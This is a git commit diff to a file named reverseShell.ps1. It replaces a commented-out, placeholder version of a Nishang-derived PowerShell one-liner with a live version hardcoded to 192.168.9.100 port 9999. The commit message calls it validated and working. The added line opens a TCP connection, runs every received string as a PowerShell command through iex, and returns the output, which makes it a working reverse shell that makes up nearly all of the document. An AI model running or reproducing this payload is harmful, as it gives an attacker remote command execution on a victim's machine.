8a5ae77e1248632850d127cebe4f8b2c03dd0cac
diegofelipe01 <50500419+diegofelipe01@users.noreply.github.com>
2020-07-27 11:52:09 -0300

    Validated upload
    Everything is working, just remember to change the IP and port

--- reverseShell/reverseShell.ps1
+++ reverseShell/reverseShell.ps1
@@ -1,2 +1,1 @@
-#A simple and small reverse shell by samratashok's Nishang framework. Change the Host IP Address and Port according to your setup as described in the README file of the script. 
-#$sm=(New-Object Net.Sockets.TCPClient("HOST_IP","port_used")).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
+$sm=(New-Object Net.Sockets.TCPClient("192.168.9.100",9999)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
